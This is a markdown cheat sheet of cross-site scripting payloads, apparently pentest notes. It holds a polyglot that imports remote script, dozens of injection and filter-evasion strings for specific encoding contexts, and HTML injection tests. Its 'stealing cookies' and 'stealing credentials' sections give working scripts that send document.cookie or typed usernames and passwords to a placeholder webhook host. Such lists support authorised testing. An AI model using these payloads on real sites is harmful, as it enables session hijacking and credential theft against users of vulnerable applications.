## Testing XSS

**One Payload for Testing All Kinds of Scenarios**
```javascript
JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
<!--</Title/<​/Style/<​/Script/</textArea/</iFrame>
\74k<K/contentEditable/autoFocus/OnFocus​=
/*${/*/;{/**/(import(/https:\\x55.is/.source))}//\76-->
```
```javascript
JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
</Title/<​/Style/<​/Script/</textArea/</iFrame>
\74k<K/contentEditable/autoFocus/OnFocus​=
/*${/*/;{/**/(import(/https:\\x55.is/.source))}//\76
```

**Note**
1. Check HTML tags and attributes for reflection.
2. If `<` and `>` symbols are reflected in the source code without encoding, XSS is possible.
3. If `'` or `"` symbols are reflected in the source code without encoding, XSS is possible.

---

## Testing XSS in Various Scenarios
```javascript
<script>alert(1337)</script>
```
```javascript
><script>alert(1337)</script>
```
```javascript
<sCrIpt>alert(1337)</sCripT>
```
```javascript
">cyborg71<script>alert(1337)</script>
```
```javascript
<svg/ onload=alert(1337)//
```
```javascript
<Svg/OnLoad=(confirm)(1337)<!--
```
```javascript
<body/OnResize=(confirm)(123456)<!--
```
```javascript
<img src=x onerror=alert(1337)>
```
```javascript
</script><img src=x onerror=alert(1337)>
```
```javascript
<iframe src="javascript:alert(1337)">
```
```javascript
';alert(1337)//
```
```javascript
${alert(1337)}
```
```html
<custom-tag onmouseover='alert(1337)'>
```
```javascript
/?x=y'%09onclick='alert(1337)'%09accessKey='x'
```
```javascript
/?'accesskey='x'onclick='alert(1337)
```
Inject in href attribute:
```javascript
javascript:alert(1337)
```
```html
y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1337)%3E
```
```html
"><h1>cyborg.71</h1>
```
```javascript
<script onclick="alert(1337)">
```
```html
<a href="javascript:alert('XSS')">Click me</a>
```
```html
<img src="https://i.imgflip.com/8uo0t9.jpg">
```

**External Sources for Payloads**
- [XSS Payload List](https://github.com/payloadbox/xss-payload-list)
- [Tiny XSS Payloads for Filter Bypass](https://github.com/terjanq/Tiny-XSS-Payloads)

---

## HTML Injection
```html
<h1>cyborg71</h1>
```
```html
"><h1>cyborg71</h1>
```
```html
<a href="https://google.com"></a>
```

---

## Angle Brackets HTML-Encoded Bypass

### Reflected XSS in HTML Attribute with Angle Brackets HTML-Encoded
Inject:
```html
<xss123>'"
```
Check if angle brackets `<` and `>` are encoded as `&lt;` and `&gt;`. If so, use these payloads:
```javascript
" onclick="alert(1337)
```
```javascript
" autofocus="alert(1337)
```
```javascript
" autofocus onfocus="alert(1337)
```
```javascript
" onmouseover="alert(1)
```

### Reflected XSS in a JavaScript String with Angle Brackets HTML-Encoded
Inject:
```html
<xss123>'"
```
Payloads to break out of the JavaScript context:
```javascript
xss';alert(1);'xss
```
```javascript
'-alert(1)-'
```

---

## Reflected XSS with Single Quote and Backslash Escaped
Close the script tag and inject:
```javascript
</script><img src=x onerror=alert(1337)>
```

---

## Reflected XSS with Angle Brackets and Double Quotes HTML-Encoded
Payloads:
```javascript
\';alert(1337)//
```
```javascript
\'-alert(1)//
```

---

## Tags and Attribute Block Bypass

### Reflected XSS into HTML Context with Most Tags and Attributes Blocked
Use:
```html
"><body onresize=alert(1337)>
```

### Reflected XSS into HTML Context with Custom Tags
Payloads:
```html
<custom-tag tabindex="1" onfocus='alert(1337)' id="a1">#a1
```
```html
<xss id=a1 onfocus=alert(document.cookie) tabindex=1>#a1
```

---

## Reflected XSS with Some SVG Markup Allowed
```html
"><svg><animatetransform onbegin=alert(1337)></animatetransform></svg>
```
```html
"><svg><animatetransform onbegin='alert(1337)'></animatetransform></svg>
```

---

## Reflected XSS in Canonical Link Tag
Make a custom URL:
```
http://example.com/?whoami=cyborg71
```
If the `whoami` parameter is reflected in the page source, try these payloads:
```javascript
/?whoami=cyborg71'%09onclick='alert(1337)'%09accessKey='x'
```
```javascript
/?'accesskey='x'onclick='alert(1337)
```

---

## Payloads for Stealing Cookies
```javascript
<script>
fetch('https://your-webhook-url.oastify.com', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
});
</script>
```
```javascript
<script>document.location='https://your-webhook-url.oastify.com//'+document.cookie</script>
```

---

## Payloads for Stealing Credentials
```html
<input name="username" id="username">
<input type="password" name="password" onchange="if(this.value.length)fetch('https://your-webhook-url.oastify.com',{
  method: 'POST',
  mode: 'no-cors',
  body: username.value+':'+this.value
});">
```

---

## XSS with Filter Evasion
```html
<IMG SRC="jav&#x09;ascript:alert('XSS');">
```
```html
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
```
```html
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
```

**XSS Filter Evasion Cheat Sheet**
- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

---
